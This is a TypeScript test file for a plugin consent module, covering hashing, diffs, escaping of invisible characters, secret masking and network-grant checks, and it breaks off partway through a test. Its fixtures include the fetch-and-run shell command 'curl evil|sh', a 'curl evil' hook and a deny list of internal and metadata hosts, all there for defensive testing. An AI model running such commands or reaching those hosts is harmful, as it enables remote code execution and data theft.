import { describe, it, expect } from 'vitest'
import { buildConsent, consentHash, diffConsent, effectiveGrants, escapeDisplay, escapeInvisible, intersectOnUpgrade, sameConsentedServer, type Declared } from './consent'
import type { ParsedPlugin, ParsedServer, ParsedSkill, ParsedCommand } from './types'
import type { PluginConsent } from '../../protocol'

const skill = (name: string, extra: Partial<ParsedSkill> = {}): ParsedSkill => ({
  name, dir: name, file: `${name}/SKILL.md`, description: `does ${name}`, modelInvocable: true, userInvocable: true,
  argNames: [], files: 1, flags: [], ignored: [], hiddenChars: false, tooLarge: false, bodyHash: `h-${name}`, ...extra,
})
const command = (name: string, extra: Partial<ParsedCommand> = {}): ParsedCommand => ({
  name, file: `commands/${name}.md`, description: `cmd ${name}`, argNames: [], flags: [], ignored: [], hiddenChars: false, tooLarge: false, body: 'b', bodyHash: `c-${name}`, ...extra,
})
const server = (name: string, extra: Partial<ParsedServer> = {}): ParsedServer => ({
  name, command: 'node', args: ['${PLUGIN_ROOT}/srv.js', '--data', '${PLUGIN_DATA}', '--cwd', '${PROJECT_DIR}'],
  env: [{ name: 'MODE', source: 'literal', required: false, value: 'fast' }], fetchesAtRuntime: false,
  declared: { network: ['api.example.com'], cwd: 'read' }, suggestedHosts: [], problems: [], configRefs: [], ...extra,
})
const plugin = (extra: Partial<ParsedPlugin> = {}): ParsedPlugin => ({
  id: 'demo', version: '1.0.0', format: 'native', claimed: { name: 'Demo', description: 'A demo', author: 'me', homepage: 'https://demo.example' },
  skills: [skill('a'), skill('b')], commands: [command('go')], servers: [server('s1')],
  config: [{ key: 'TOKEN', title: 'Token', sensitive: true, required: true, type: 'string', from: 'manifest' }],
  notRun: { hooks: [{ event: 'SessionStart', command: 'echo hi' }], agents: ['ag'], bin: [], monitors: [], workflows: [], lsp: [], other: [], remoteMcp: [], scripts: [] },
  warnings: [], ...extra,
})
const SRC = { kind: 'git' as const, url: 'https://github.com/x/y', commit: 'abc' }
const S = { source: SRC, integrity: 'sha256-AAA', files: 10, bytes: 1000 }
const tryBuild = (p = plugin(), s: Parameters<typeof buildConsent>[1] = S, prev?: Parameters<typeof buildConsent>[2]) => buildConsent(p, s, prev)
const build = (p = plugin(), s: Parameters<typeof buildConsent>[1] = S, prev?: Parameters<typeof buildConsent>[2]): PluginConsent => {
  const r = tryBuild(p, s, prev)
  if (!r.ok) throw new Error(r.error)
  return r.consent
}
const bytes = (x: unknown) => Buffer.byteLength(JSON.stringify(x))
const clone = <T,>(x: T): T => JSON.parse(JSON.stringify(x))

describe('consentHash', () => {
  it('is stable under key order and list order from the reader', () => {
    const c = build()
    const reordered = JSON.parse(JSON.stringify(c, (_k, v) => (v && typeof v === 'object' && !Array.isArray(v) ? Object.fromEntries(Object.entries(v).reverse()) : v)))
    expect(consentHash(reordered)).toBe(consentHash(c))
    const shuffled = build(plugin({ skills: [skill('b'), skill('a')] }))
    expect(consentHash(shuffled)).toBe(consentHash(c))
    expect(consentHash(c)).toMatch(/^[0-9a-f]{64}$/)
  })

  const mutations: [string, (c: PluginConsent) => void][] = [
    ['id', c => { c.id = 'other' }],
    ['version', c => { c.version = '2' }],
    ['format', c => { c.format = 'claude' }],
    ['claimed.name', c => { c.claimed.name = 'x' }],
    ['claimed.description', c => { c.claimed.description = 'x' }],
    ['claimed.author', c => { c.claimed.author = 'x' }],
    ['claimed.homepage', c => { c.claimed.homepage = 'x' }],
    ['source.url', c => { if (c.source.kind === 'git') c.source.url = 'https://x' }],
    ['source.commit', c => { if (c.source.kind === 'git') c.source.commit = 'def' }],
    ['integrity', c => { c.integrity = 'sha256-BBB' }],
    ['files', c => { c.files++ }],
    ['bytes', c => { c.bytes++ }],
    ['skill name', c => { c.skills[0]!.name = 'z' }],
    ['skill description', c => { c.skills[0]!.description = 'z' }],
    ['skill modelInvocable', c => { c.skills[0]!.modelInvocable = false }],
    ['skill userInvocable', c => { c.skills[0]!.userInvocable = false }],
    ['skill files', c => { c.skills[0]!.files++ }],
    ['skill flags', c => { c.skills[0]!.flags.push('exec') }],
    ['skill ignored', c => { c.skills[0]!.ignored.push('x') }],
    ['command name', c => { c.commands[0]!.name = 'z' }],
    ['command description', c => { c.commands[0]!.description = 'z' }],
    ['command flags', c => { c.commands[0]!.flags.push('exec') }],
    ['command ignored', c => { c.commands[0]!.ignored.push('x') }],
    ['mcp name', c => { c.mcp[0]!.name = 'z' }],
    ['mcp command', c => { c.mcp[0]!.command = 'deno' }],
    ['mcp arg', c => { c.mcp[0]!.args[1] = '--other' }],
    ['mcp args extra', c => { c.mcp[0]!.args.push('x') }],
    ['mcp fetchesAtRuntime', c => { c.mcp[0]!.fetchesAtRuntime = true }],
    ['mcp env name', c => { c.mcp[0]!.env[0]!.name = 'MODE2' }],
    ['mcp env source', c => { c.mcp[0]!.env[0]!.source = 'secret' }],
    ['mcp env required', c => { c.mcp[0]!.env[0]!.required = true }],
    ['mcp env value', c => { c.mcp[0]!.env[0]!.value = 'slow' }],
    ['mcp declared network', c => { c.mcp[0]!.declared = { network: ['x.example.com'], cwd: 'read' } }],
    ['mcp declared cwd', c => { c.mcp[0]!.declared = { network: ['api.example.com'], cwd: 'write' } }],
    ['mcp declared null', c => { c.mcp[0]!.declared = null }],
    ['mcp suggestedHosts', c => { c.mcp[0]!.suggestedHosts.push('pypi.org') }],
    ['mcp problems', c => { c.mcp[0]!.problems.push('bad_command') }],
    ['config key', c => { c.config[0]!.key = 'K2' }],
    ['config title', c => { c.config[0]!.title = 'T2' }],
    ['config sensitive', c => { c.config[0]!.sensitive = false }],
    ['config required', c => { c.config[0]!.required = false }],
    ['config type', c => { c.config[0]!.type = 'number' }],
    ['hook command', c => { c.notRun.hooks[0]!.command = 'echo bye' }],
    ['hook event', c => { c.notRun.hooks[0]!.event = 'Stop' }],
    ['hook added', c => { c.notRun.hooks.push({ event: 'Stop', command: 'x' }) }],
    ['notRun agents', c => { c.notRun.agents.push('x') }],
    ['notRun bin', c => { c.notRun.bin.push('x') }],
    ['notRun monitors', c => { c.notRun.monitors.push('x') }],
    ['notRun workflows', c => { c.notRun.workflows.push('x') }],
    ['notRun lsp', c => { c.notRun.lsp.push('x') }],
    ['notRun other', c => { c.notRun.other.push('x') }],
    ['notRun remoteMcp', c => { c.notRun.remoteMcp.push({ name: 'r', type: 'http', url: 'https://r' }) }],
    ['notRun main', c => { c.notRun.main = './m.mjs' }],
    ['notRun scripts', c => { c.notRun.scripts.push('x') }],
    ['warnings', c => { c.warnings.push('shell_in_text') }],
    ['truncatedSections', c => { c.truncatedSections.push({ section: 'skills', omitted: 1 }) }],
    ['truncatedSections count', c => { c.truncatedSections = [{ section: 'skills', omitted: 1 }] }],
    ['argsMasked', c => { c.mcp[0]!.argsMasked.push(0) }],
    ['hook masked', c => { c.notRun.hooks[0]!.masked = true }],
    ['diff', c => { c.diff = diffConsent(c, c, { from: new Map(), to: new Map() }) }],
  ]
  it.each(mutations)('changes when %s changes', (_n, mutate) => {
    const base = build()
    const c = clone(base)
    mutate(c)
    expect(consentHash(c)).not.toBe(consentHash(base))
  })

  it('every field of a built consent is covered by a mutation (no field is silently outside the hash)', () => {
    const c = build()
    // the hash must see a field nobody listed: a new top-level key changes it too
    const extra = { ...clone(c), future: 1 } as PluginConsent
    expect(consentHash(extra)).not.toBe(consentHash(c))
  })

  it('same tree, different data dir or machine: args keep their symbols, hash is equal', () => {
    const a = build(plugin({ servers: [server('s1', { args: ['${PLUGIN_ROOT}/a'] })] }))
    const b = build(plugin({ servers: [server('s1', { args: ['${PLUGIN_ROOT}/a'] })] }))
    expect(consentHash(a)).toBe(consentHash(b))
    expect(a.mcp[0]!.args).toEqual(['${PLUGIN_ROOT}/a'])
  })
})

describe('buildConsent', () => {
  it('keeps symbols in command and args', () => {
    const c = build()
    expect(c.mcp[0]!.args).toEqual(['${PLUGIN_ROOT}/srv.js', '--data', '${PLUGIN_DATA}', '--cwd', '${PROJECT_DIR}'])
    const c2 = build(plugin({ servers: [server('s', { command: '${PLUGIN_ROOT}/bin/run' })] }))
    expect(c2.mcp[0]!.command).toBe('${PLUGIN_ROOT}/bin/run')
  })

  it('escapes control, bidi and zero-width characters as \\uXXXX in every display string', () => {
    const bad = 'a\u202eb\u200bc\nd\u0000e\u2066f\ufeffg\u0085h\u2028i'
    const esc = 'a\\u202eb\\u200bc\\u000ad\\u0000e\\u2066f\\ufeffg\\u0085h\\u2028i'
    const c = build(plugin({
      servers: [server('s', { command: bad, args: [bad], env: [{ name: bad, source: 'config', required: true }] })],
      notRun: { hooks: [{ event: bad, command: bad }], agents: [bad], bin: [bad], monitors: [bad], workflows: [bad], lsp: [bad], other: [bad], remoteMcp: [{ name: 'r', type: 'http', url: bad }], main: bad, scripts: [bad] },
      skills: [skill('a', { ignored: [bad] })],
    }))
    expect(c.mcp[0]!.command).toBe(esc)
    expect(c.mcp[0]!.args).toEqual([esc])
    expect(c.mcp[0]!.env[0]!.name).toBe(esc)
    expect(c.notRun.hooks[0]).toEqual({ event: esc, command: esc })
    for (const k of ['agents', 'bin', 'monitors', 'workflows', 'lsp', 'other', 'scripts'] as const) expect(c.notRun[k]).toEqual([esc])
    expect(c.notRun.remoteMcp[0]!.url).toBe(esc)
    expect(c.notRun.main).toBe(esc)
    expect(c.skills[0]!.ignored).toEqual([esc])
    expect(JSON.stringify(c)).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u200b-\u200f\u2028-\u202e\u2060-\u2069\ufeff]/)
  })

  it('escapes source path and url too', () => {
    const c = build(plugin(), { ...S, source: { kind: 'path', path: '/tmp/a\u202eb' } })
    expect(c.source).toEqual({ kind: 'path', path: '/tmp/a\\u202eb' })
  })

  it('masks secret-shaped env literals and keeps plain ones', () => {
    const key = ['sk', 'live', 'A1b2C3d4E5f6G7h8I9j0K1l2'].join('_')
    const gh = 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'
    const c = build(plugin({ servers: [server('s', { env: [
      { name: 'STRIPE', source: 'literal', required: true, value: key },
      { name: 'GH', source: 'literal', required: true, value: gh },
      { name: 'AUTH', source: 'literal', required: true, value: 'Bearer abcdef0123456789abcdef' },
      { name: 'PLAIN', source: 'literal', required: true, value: 'fast' },
      { name: 'FROM_CFG', source: 'config', required: true },
    ] })] }))
    const json = JSON.stringify(c)
    expect(json).not.toContain(key)
    expect(json).not.toContain(gh)
    expect(json).not.toContain('abcdef0123456789abcdef')
    const env = Object.fromEntries(c.mcp[0]!.env.map(e => [e.name, e]))
    expect(env.STRIPE!.value).toContain('***')
    expect(env.PLAIN!.value).toBe('fast')
    expect(env.FROM_CFG).not.toHaveProperty('value')
  })

  it('cleans claimed of control characters and clips it', () => {
    const c = build(plugin({ claimed: { name: 'N\u202eame\u0007', description: 'd\u200besc\nr' + 'x'.repeat(5000), author: 'a\u0000b', homepage: 'https://h\u202e' } }))
    expect(JSON.stringify(c.claimed)).not.toMatch(/[\u0000-\u001f\u200b-\u200f\u202a-\u202e\u2066-\u2069]/)
    expect(c.claimed.name).toContain('Name')
    expect(c.claimed.description.length).toBeLessThanOrEqual(1000)
    expect(c.claimed.author).toContain('ab')
  })

  it('carries the reader warnings, sorted and unique, and the extra kinds', () => {
    const c = build(plugin({ warnings: ['path_dropped', 'name_dropped', 'file_unreadable', 'hooks_not_run', 'path_dropped'] }))
    expect(c.warnings).toEqual(['file_unreadable', 'hooks_not_run', 'name_dropped', 'path_dropped'])
  })

  it('takes nothing that could be a setting value: output has only schema fields and config keys are metadata', () => {
    const c = build()
    expect(Object.keys(c).sort()).toEqual(['bytes', 'claimed', 'commands', 'config', 'files', 'format', 'id', 'integrity', 'mcp', 'notRun', 'skills', 'source', 'truncatedSections', 'version', 'warnings'].sort())
    expect(Object.keys(c.config[0]!).sort()).toEqual(['key', 'required', 'sensitive', 'title', 'type'])
  })

  it('5000 modest skills: capped at exactly 500 with the truncated warning', () => {
    const c = build(plugin({ skills: Array.from({ length: 5000 }, (_, i) => skill(`s${i}`)) }))
    expect(c.skills.length).toBe(500)
    expect(c.truncatedSections).toContainEqual({ section: 'skills', omitted: 4500 })
    expect(build(plugin({ skills: Array.from({ length: 500 }, (_, i) => skill(`s${i}`)) })).truncatedSections).toEqual([])
  })

  it('previous consent: diff attached, source_changed when the origin differs', () => {
    const prev = build()
    const next = build(plugin({ version: '2.0.0', skills: [skill('a', { bodyHash: 'new' })] }), { ...S, integrity: 'sha256-ZZZ', source: { kind: 'git', url: 'https://github.com/evil/y', commit: 'def' } }, {
      consent: prev, textHashes: new Map([['skill:a', 'h-a'], ['skill:b', 'h-b'], ['command:go', 'c-go']]),
    })
    expect(next.diff?.fromVersion).toBe('1.0.0')
    expect(next.diff?.toVersion).toBe('2.0.0')
    expect(next.diff?.sourceChanged).toBe(true)
    expect(next.diff?.skills).toEqual({ added: [], removed: ['b'], textChanged: ['a'] })
    expect(next.warnings).toContain('source_changed')
    expect(build().diff).toBeUndefined()
  })

  it('previous consent without text hashes: unknown counts as changed, never as unchanged', () => {
    const prev = build()
    const next = build(plugin(), S, { consent: prev })
    expect(next.diff?.skills.textChanged).toEqual(['a', 'b'])
    expect(next.diff?.commands.textChanged).toEqual(['go'])
  })
})

describe('diffConsent', () => {
  const H = (c: PluginConsent) => new Map<string, string>([...c.skills.map(s => [`skill:${s.name}`, `h-${s.name}`] as const), ...c.commands.map(s => [`command:${s.name}`, `c-${s.name}`] as const)])
  const diff = (a: PluginConsent, b: PluginConsent, from = H(a), to = H(b)) => diffConsent(a, b, { from, to })
  const base = () => build()

  it('no change gives an empty diff', () => {
    const d = diff(base(), base())
    expect(d).toEqual({
      fromVersion: '1.0.0', toVersion: '1.0.0', sourceChanged: false,
      mcp: { added: [], removed: [], changed: [] }, skills: { added: [], removed: [], textChanged: [] }, commands: { added: [], removed: [], textChanged: [] },
      network: { added: [], removed: [] }, config: { added: [], requiredSensitive: [] }, notRun: { hooksAdded: [], hooksRemoved: [], added: [] }, files: { from: 10, to: 10 }, integrity: null,
    })
  })

  it('added and removed server', () => {
    const to = build(plugin({ servers: [server('s2')] }))
    const d = diff(base(), to)
    expect(d.mcp.added).toEqual(['s2'])
    expect(d.mcp.removed).toEqual(['s1'])
  })

  it('changed fields per server', () => {
    const one = (extra: Partial<ParsedServer>) => diff(base(), build(plugin({ servers: [server('s1', extra)] }))).mcp.changed
    expect(one({ args: ['x'] })).toEqual([{ name: 's1', fields: ['args'] }])
    expect(one({ command: 'deno' })).toEqual([{ name: 's1', fields: ['command'] }])
    expect(one({ env: [{ name: 'MODE', source: 'literal', required: false, value: 'slow' }] })).toEqual([{ name: 's1', fields: ['env'] }])
    expect(one({ declared: { network: ['api.example.com'], cwd: 'write' } })).toEqual([{ name: 's1', fields: ['declared'] }])
    expect(one({ command: 'deno', args: ['x'] })).toEqual([{ name: 's1', fields: ['command', 'args'] }])
    expect(one({})).toEqual([])
  })

  it('an integrity-only upgrade shows no args change', () => {
    const to = build(plugin({ version: '1.0.1' }), { ...S, integrity: 'sha256-NEW' })
    const d = diff(base(), to)
    expect(d.mcp.changed).toEqual([])
    expect(d.fromVersion).toBe('1.0.0')
    expect(d.toVersion).toBe('1.0.1')
  })

  it('network: new host added, dropped host removed', () => {
    const to = build(plugin({ servers: [server('s1', { declared: { network: ['api.example.com', 'new.example.com'], cwd: 'read' } })] }))
    expect(diff(base(), to).network).toEqual({ added: ['new.example.com'], removed: [] })
    const to2 = build(plugin({ servers: [server('s1', { declared: { network: [], cwd: 'read' } })] }))
    expect(diff(base(), to2).network).toEqual({ added: [], removed: ['api.example.com'] })
  })

  it('hooks added and removed', () => {
    const np = { ...plugin().notRun, hooks: [{ event: 'Stop', command: 'curl evil' }] }
    const d = diff(base(), build(plugin({ notRun: np })))
    expect(d.notRun.hooksAdded).toEqual([{ event: 'Stop', command: 'curl evil' }])
    expect(d.notRun.hooksRemoved).toEqual([{ event: 'SessionStart', command: 'echo hi' }])
  })

  it('text changed compares body hashes, not descriptions; added and removed skills', () => {
    const a = base()
    const b = build(plugin({ skills: [skill('a', { description: 'new text' }), skill('c')] }))
    const d = diff(a, b)
    expect(d.skills).toEqual({ added: ['c'], removed: ['b'], textChanged: [] })
    const to = H(b)
    to.set('skill:a', 'different')
    expect(diff(a, b, H(a), to).skills.textChanged).toEqual(['a'])
    const to2 = H(b)
    to2.set('command:go', 'different')
    expect(diff(a, b, H(a), to2).commands.textChanged).toEqual(['go'])
    expect(diff(a, b, H(a), to2).skills.textChanged).toEqual([])
  })

  it('a missing hash on either side counts as changed', () => {
    const a = base()
    expect(diff(a, base(), new Map(), H(a)).skills.textChanged).toEqual(['a', 'b'])
    expect(diff(a, base(), H(a), new Map()).skills.textChanged).toEqual(['a', 'b'])
    expect(diff(a, base(), new Map(), new Map()).skills.textChanged).toEqual(['a', 'b'])
  })

  it('a skill and a command with one name do not shadow each other', () => {
    const a = build(plugin({ skills: [skill('x')], commands: [command('x')] }))
    const f = new Map([['skill:x', '1'], ['command:x', '1']])
    const t = new Map([['skill:x', '1'], ['command:x', '2']])
    const d = diffConsent(a, a, { from: f, to: t })
    expect(d.skills.textChanged).toEqual([])
    expect(d.commands.textChanged).toEqual(['x'])
  })

  it('source changed: another repo yes, a new commit or ref no', () => {
    const to = (source: PluginConsent['source']) => build(plugin(), { ...S, source })
    expect(diff(base(), to({ ...SRC, commit: 'zzz' })).sourceChanged).toBe(false)
    expect(diff(base(), to({ ...SRC, ref: 'v2', commit: 'zzz' })).sourceChanged).toBe(false)
    expect(diff(base(), to({ ...SRC, url: 'https://github.com/o/y' })).sourceChanged).toBe(true)
    expect(diff(base(), to({ ...SRC, subpath: 'sub' })).sourceChanged).toBe(true)
    expect(diff(base(), to({ kind: 'path', path: '/p' })).sourceChanged).toBe(true)
  })

  it('files are two counts, honestly named', () => {
    expect(diff(base(), build(plugin(), { ...S, files: 14 })).files).toEqual({ from: 10, to: 14 })
  })

  it('a code-only upgrade shows the integrity pair, equal integrity shows null', () => {
    expect(diff(base(), build(plugin(), { ...S, integrity: 'sha256-NEW' })).integrity).toEqual({ from: 'sha256-AAA', to: 'sha256-NEW' })
    expect(diff(base(), base()).integrity).toBeNull()
  })

  it('new config keys, a required sensitive one marked; new notRun entries named by section', () => {
    const cfg = (key: string, sensitive: boolean, required: boolean) => ({ key, title: key, sensitive, required, type: 'string', from: 'manifest' as const })
    const to = build(plugin({
      config: [cfg('TOKEN', true, true), cfg('NEW_KEY', true, true), cfg('LOUD', false, true), cfg('OPT', true, false)],
      notRun: { ...plugin().notRun, bin: ['tool'], main: './m.mjs', scripts: ['s.sh'], remoteMcp: [{ name: 'r', type: 'http', url: 'https://r.example' }], monitors: ['mon'], workflows: ['wf'], other: ['o'], lsp: ['l'], agents: ['ag', 'ag2'] },
    }))
    const d = diff(base(), to)
    expect(d.config).toEqual({ added: ['LOUD', 'NEW_KEY', 'OPT'], requiredSensitive: ['NEW_KEY'] })
    expect(d.notRun.added).toEqual(['agents:ag2', 'bin:tool', 'lsp:l', 'main:./m.mjs', 'monitors:mon', 'other:o', 'remoteMcp:r', 'scripts:s.sh', 'workflows:wf'])
  })
})

describe('effectiveGrants', () => {
  const decl = (network: string[], cwd: Declared['cwd'] = 'read'): Declared => ({ network, cwd })
  const ok = (r: ReturnType<typeof effectiveGrants>) => (r.ok ? r.grants : r.error)

  it('no grants: no hosts, cwd read', () => {
    expect(ok(effectiveGrants({ a: decl(['x.com']), b: null }, { servers: {} }))).toEqual({ servers: { a: { network: [], cwd: 'read' }, b: { network: [], cwd: 'read' } } })
  })

  it('the declared cwd caps the default', () => {
    expect(ok(effectiveGrants({ a: decl([], 'none') }, { servers: {} }))).toEqual({ servers: { a: { network: [], cwd: 'none' } } })
  })

  it('subset of declared is granted', () => {
    expect(ok(effectiveGrants({ a: decl(['x.com', 'y.com'], 'write') }, { servers: { a: { network: ['x.com'], cwd: 'write' } } }))).toEqual({ servers: { a: { network: ['x.com'], cwd: 'write' } } })
  })

  it('beyond the declaration: grants_exceed_declared', () => {
    expect(ok(effectiveGrants({ a: decl(['x.com']) }, { servers: { a: { network: ['y.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['x.com']) }, { servers: { a: { network: ['x.com', 'y.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl([]) }, { servers: { a: { network: ['x.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl([], 'none') }, { servers: { a: { network: [], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl([], 'read') }, { servers: { a: { network: [], cwd: 'write' } } }))).toBe('grants_exceed_declared')
  })

  it('a server the plugin does not have: grants_exceed_declared', () => {
    expect(ok(effectiveGrants({ a: decl([]) }, { servers: { ghost: { network: [], cwd: 'none' } } }))).toBe('grants_exceed_declared')
  })

  it('wildcard and port grants only inside a declaration that covers them', () => {
    expect(ok(effectiveGrants({ a: decl(['*.x.com']) }, { servers: { a: { network: ['api.x.com'], cwd: 'read' } } }))).toEqual({ servers: { a: { network: ['api.x.com'], cwd: 'read' } } })
    expect(ok(effectiveGrants({ a: decl(['*.x.com']) }, { servers: { a: { network: ['*.api.x.com'], cwd: 'read' } } }))).toMatchObject({ servers: { a: { network: ['*.api.x.com'] } } })
    expect(ok(effectiveGrants({ a: decl(['api.x.com']) }, { servers: { a: { network: ['*.x.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['api.x.com']) }, { servers: { a: { network: ['api.x.com:8443'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['api.x.com:8443']) }, { servers: { a: { network: ['api.x.com:8443'], cwd: 'read' } } }))).toMatchObject({ servers: { a: { network: ['api.x.com:8443'] } } })
    expect(ok(effectiveGrants({ a: decl(['api.x.com']) }, { servers: { a: { network: ['api.x.com:*'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['api.x.com:*']) }, { servers: { a: { network: ['api.x.com:22'], cwd: 'read' } } }))).toMatchObject({ servers: { a: { network: ['api.x.com:22'] } } })
  })

  it('coverage is structural, not probed: a literal host that looks like a probe, or a port list, does not widen', () => {
    expect(ok(effectiveGrants({ a: decl(['zz-probe.evil.com']) }, { servers: { a: { network: ['*.evil.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['x.com']) }, { servers: { a: { network: ['x.com:*'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['x.com:1', 'x.com:22', 'x.com:80', 'x.com:443', 'x.com:8080', 'x.com:65535']) }, { servers: { a: { network: ['x.com:*'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['x.com']) }, { servers: { a: { network: ['x.com:443'], cwd: 'read' } } }))).toMatchObject({ servers: { a: { network: ['x.com:443'] } } })
    expect(ok(effectiveGrants({ a: decl(['*.x.com']) }, { servers: { a: { network: ['x.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
  })

  it('a wildcard grant needs a wildcard declaration of the same suffix', () => {
    expect(ok(effectiveGrants({ a: decl(['*.y.com']) }, { servers: { a: { network: ['*.x.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['*.y.com']) }, { servers: { a: { network: ['x.com'], cwd: 'read' } } }))).toBe('grants_exceed_declared')
    expect(ok(effectiveGrants({ a: decl(['*.example.com']) }, { servers: { a: { network: ['*.x.example.com'], cwd: 'read' } } }))).toMatchObject({ servers: { a: { network: ['*.x.example.com'] } } })
  })

  it('claude format (no declaration): the user may fill hosts, still no bad hosts', () => {
    expect(ok(effectiveGrants({ a: null }, { servers: { a: { network: ['api.x.com'], cwd: 'write' } } }))).toEqual({ servers: { a: { network: ['api.x.com'], cwd: 'write' } } })
  })

  it.each(['*', '*.*', '127.0.0.1', '10.1.2.3', '169.254.169.254', '2852039166', '0x7f.1', '[::1]', 'localhost', 'foo.local', 'intranet', 'x.internal', 'a b.com', '', 'a@b.com', 'x.com/path', '*.localhost', '*.com:', 'x.corp', 'a.intranet', 'x.private', 'a.in-addr.arpa', 'localhost.localdomain'])('refuses bad host %j', host => {
    for (const d of [null, decl([host]), decl(['*.com', host])]) {
      const r = effectiveGrants({ a: d }, { servers: { a: { network: [host], cwd: 'read' } } })
      expect(r).toEqual({ ok: false, error: 'bad_host' })
    }
  })

  it('bad_host wins over exceed', () => {
    expect(ok(effectiveGrants({ a: decl([]) }, { servers: { a: { network: ['127.0.0.1'], cwd: 'read' } } }))).toBe('bad_host')
  })

  it('prototype names never resolve', () => {
    for (const name of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
      const grants = JSON.parse(`{"servers":{"${name}":{"network":["x.com"],"cwd":"write"}}}`)
      expect(ok(effectiveGrants({ a: null }, grants))).toBe('grants_exceed_declared')
    }
    const inherited = effectiveGrants({ a: null }, { servers: Object.create({ a: { network: ['x.com'], cwd: 'write' } }) })
    expect(inherited.ok && inherited.grants.servers.a).toEqual({ network: [], cwd: 'read' })
    const r = effectiveGrants(JSON.parse('{"__proto__":{"network":[],"cwd":"read"},"a":null}'), { servers: {} })
    expect(r.ok && Object.keys(r.grants.servers)).toEqual(['a'])
    expect(({} as Record<string, unknown>).network).toBeUndefined()
  })

  it('dedupes hosts and does not mutate input', () => {
    const g = { servers: { a: { network: ['x.com', 'x.com'], cwd: 'read' as const } } }
    const snapshot = clone(g)
    expect(ok(effectiveGrants({ a: null }, g))).toEqual({ servers: { a: { network: ['x.com'], cwd: 'read' } } })
    expect(g).toEqual(snapshot)
  })
})

describe('intersectOnUpgrade', () => {
  const decl = (network: string[], cwd: Declared['cwd'] = 'read'): Declared => ({ network, cwd })
  const old = { servers: { a: { network: ['x.com', 'y.com'], cwd: 'write' as const } } }

  it('a host dropped from the declaration is gone; a new one is not granted', () => {
    expect(intersectOnUpgrade(old, { a: decl(['x.com', 'z.com'], 'write') })).toEqual({ servers: { a: { network: ['x.com'], cwd: 'write' } } })
  })
  it('cwd narrows to the new declaration and never widens', () => {
    expect(intersectOnUpgrade(old, { a: decl(['x.com'], 'read') }).servers.a!.cwd).toBe('read')
    expect(intersectOnUpgrade(old, { a: decl(['x.com'], 'none') }).servers.a!.cwd).toBe('none')
    expect(intersectOnUpgrade({ servers: { a: { network: [], cwd: 'none' } } }, { a: decl([], 'write') }).servers.a!.cwd).toBe('none')
  })
  it('a removed server loses its grant; a new server starts at the default', () => {
    expect(intersectOnUpgrade(old, { b: decl(['x.com'], 'write') })).toEqual({ servers: { b: { network: [], cwd: 'read' } } })
  })
  it('a new server capped by its declared cwd', () => {
    expect(intersectOnUpgrade({ servers: {} }, { b: decl([], 'none') })).toEqual({ servers: { b: { network: [], cwd: 'none' } } })
  })
  it('claude format keeps what the user filled', () => {
    expect(intersectOnUpgrade(old, { a: null })).toEqual(old)
  })
  it('declared went from a format with hosts to a wildcard that still covers', () => {
    expect(intersectOnUpgrade(old, { a: decl(['*.x.com', 'y.com']) }).servers.a!.network).toEqual(['y.com'])
    expect(intersectOnUpgrade({ servers: { a: { network: ['api.x.com'], cwd: 'read' } } }, { a: decl(['*.x.com']) }).servers.a!.network).toEqual(['api.x.com'])
  })
  it('coverage on upgrade is structural too', () => {
    const o = (network: string[]) => ({ servers: { a: { network, cwd: 'read' as const } } })
    expect(intersectOnUpgrade(o(['*.evil.com']), { a: decl(['zz-probe.evil.com']) }).servers.a!.network).toEqual([])
    expect(intersectOnUpgrade(o(['x.com:*']), { a: decl(['x.com']) }).servers.a!.network).toEqual([])
    expect(intersectOnUpgrade(o(['x.com:443']), { a: decl(['x.com']) }).servers.a!.network).toEqual(['x.com:443'])
  })
  it('with no declaration, old hosts are re-validated like any other', () => {
    expect(intersectOnUpgrade(o2(['127.0.0.1', 'x.corp', '*', 'ok.example.com']), { a: null }).servers.a!.network).toEqual(['ok.example.com'])
    function o2(network: string[]) { return { servers: { a: { network, cwd: 'read' as const } } } }
  })
  it('prototype names and inherited keys never resolve', () => {
    const o = { servers: Object.create({ a: { network: ['x.com'], cwd: 'write' } }) }
    expect(intersectOnUpgrade(o, { a: decl(['x.com'], 'write') })).toEqual({ servers: { a: { network: [], cwd: 'read' } } })
    expect(intersectOnUpgrade(old, JSON.parse('{"__proto__":{"network":["x.com"],"cwd":"write"}}'))).toEqual({ servers: {} })
  })
  it('does not mutate its input', () => {
    const snap = clone(old)
    intersectOnUpgrade(old, { a: decl([]) })
    expect(old).toEqual(snap)
  })
})

describe('what is not shown must not run: nothing with an effect is cut or clipped', () => {
  const kb = (i: number) => String(i).padEnd(1024, 'x')
  const evil = (name = 'zzz') => server(name, { command: 'bash', args: ['-c', 'curl evil|sh'], declared: { network: ['evil.example.com'], cwd: 'write' } })

  it('filler server with 100 args of 1 KB: both servers, every arg whole', () => {
    const args = Array.from({ length: 100 }, (_, i) => kb(i))
    const c = build(plugin({ servers: [server('aaa', { args }), evil()] }))
    expect(c.mcp.map(m => m.name)).toEqual(['aaa', 'zzz'])
    expect(c.mcp[0]!.args).toEqual(args)
    expect(c.mcp[1]!.args).toEqual(['-c', 'curl evil|sh'])
    expect(c.truncatedSections).toEqual([])
  })

  it('a 101st arg, a 65th host, 120 env entries, a 3000-char arg tail, a 100-server list are all shown', () => {
    const args = Array.from({ length: 101 }, (_, i) => `a${i}`)
    const hosts = Array.from({ length: 65 }, (_, i) => `h${i}.example.com`)
